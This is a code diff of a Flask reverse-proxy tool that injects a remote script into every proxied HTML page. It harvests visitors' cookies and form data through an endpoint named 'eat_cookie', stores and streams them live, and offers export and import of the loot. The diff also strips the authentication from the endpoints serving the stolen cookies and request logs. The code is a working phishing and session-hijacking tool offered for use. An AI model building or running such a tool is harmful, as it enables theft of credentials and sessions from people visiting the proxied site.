@@ -1,7 +1,6 @@
 from flask import Flask, request, Response, send_from_directory, jsonify
-import requests, re, json, os, hashlib
+import requests, re, json, os
 from datetime import datetime
-from functools import wraps
 from flask_socketio import SocketIO, emit
 import brotli
 
@@ -13,7 +12,6 @@ if not os.path.exists('cookies.json'):
 if not os.path.exists('config.json'):
     with open('config.json', 'w') as f:
         json.dump({
-            'ADMIN_PASSWORD': hashlib.sha256('admin'.encode()).hexdigest(),  # Default password: admin
             'BLOCKED_EXTENSIONS': ['.exe', '.dll', '.bat'],
             'BLOCKED_IPS': []
         }, f)
@@ -24,21 +22,6 @@ with open('config.json', 'r') as f:
 
 requests_history = []
 MAX_HISTORY = 50
-
-def check_auth(username, password):
-    if username != 'admin':
-        return False
-    return hashlib.sha256(password.encode()).hexdigest() == CONFIG['ADMIN_PASSWORD']
-
-def requires_auth(f):
-    @wraps(f)
-    def decorated(*args, **kwargs):
-        auth = request.authorization
-        if not auth or not check_auth(auth.username, auth.password):
-            return Response('Could not verify your access level', 401,
-                          {'WWW-Authenticate': 'Basic realm="Login Required"'})
-        return f(*args, **kwargs)
-    return decorated
 
 def is_request_allowed(path, ip):
     if any(path.endswith(ext) for ext in CONFIG['BLOCKED_EXTENSIONS']):
@@ -63,7 +46,6 @@ def start_proxy(target, host, port, secret):
     def payload():
         return send_from_directory('.', 'payload-script.js')
 
-    # Enhanced API endpoints
     @app.route('/ep/api/ping', methods=['POST'])
     def eat_cookie():
         cookies = request.cookies
@@ -87,12 +69,10 @@ def start_proxy(target, host, port, secret):
         with open('cookies.json', 'w') as f:
             json.dump(existing_cookies, f)
 
-        # Emit WebSocket event for real-time updates
         socketio.emit('new_cookie', {'cookies': cookie_data})
         return jsonify({'message': 'Pong!'}), 200
 
     @app.route('/ep/api/getCookies', methods=['GET'])
-    @requires_auth
     def get_cookies():
         with open('cookies.json', 'r') as f:
             cookies = json.load(f)
@@ -120,7 +100,6 @@ def start_proxy(target, host, port, secret):
         return jsonify(response_data), 200
 
     @app.route('/ep/api/requests', methods=['GET'])
-    @requires_auth
     def get_requests():
         return jsonify(requests_history[-MAX_HISTORY:])
 
@@ -133,7 +112,6 @@ def start_proxy(target, host, port, secret):
         }), 200
 
     @app.route('/ep/api/export', methods=['GET'])
-    @requires_auth
     def export_data():
         data = {
             'cookies': json.load(open('cookies.json')),
@@ -147,7 +125,6 @@ def start_proxy(target, host, port, secret):
         return jsonify(data)
 
     @app.route('/ep/api/import', methods=['POST'])
-    @requires_auth
     def import_data():
         try:
             data = request.json
@@ -167,7 +144,6 @@ def start_proxy(target, host, port, secret):
         socketio.emit('new_form', {'form_data': data})
         return jsonify({'status': 'success'})
 
-    # Main proxy route
     @app.route('/', defaults={'path': ''}, methods=['GET', 'POST', 'PUT', 'DELETE', 'PATCH'])
     @app.route('/<path:path>', methods=['GET', 'POST', 'PUT', 'DELETE', 'PATCH'])
     def proxy(path):
@@ -193,7 +169,6 @@ def start_proxy(target, host, port, secret):
                 allow_redirects=False
             )
 
-            # Log request
             request_log = {
                 'timestamp': datetime.now().isoformat(),
                 'method': request.method,
@@ -205,7 +180,6 @@ def start_proxy(target, host, port, secret):
             if len(requests_history) > MAX_HISTORY:
                 requests_history.pop(0)
 
-            # Emit WebSocket event for real-time updates
             socketio.emit('new_request', {'request': request_log})
 
             response_headers = {
@@ -213,7 +187,6 @@ def start_proxy(target, host, port, secret):
                 if key.lower() not in ['content-encoding', 'transfer-encoding', 'content-length', 'date', 'server']
             }
 
-            # Handle Brotli encoding
             resp_content = resp.content
             if 'content-encoding' in resp.headers and 'br' in resp.headers['content-encoding']:
                 try:
@@ -221,7 +194,6 @@ def start_proxy(target, host, port, secret):
                 except brotli.error:
                     pass
 
-            # Inject payload
             if 'content-type' in resp.headers and 'text/html' in resp.headers['content-type']:
                 resp_content = resp_content.decode('utf-8')
                 resp_content = re.sub(r'<head>', r'<head><script src="/payload-script.js"></script>', resp_content)
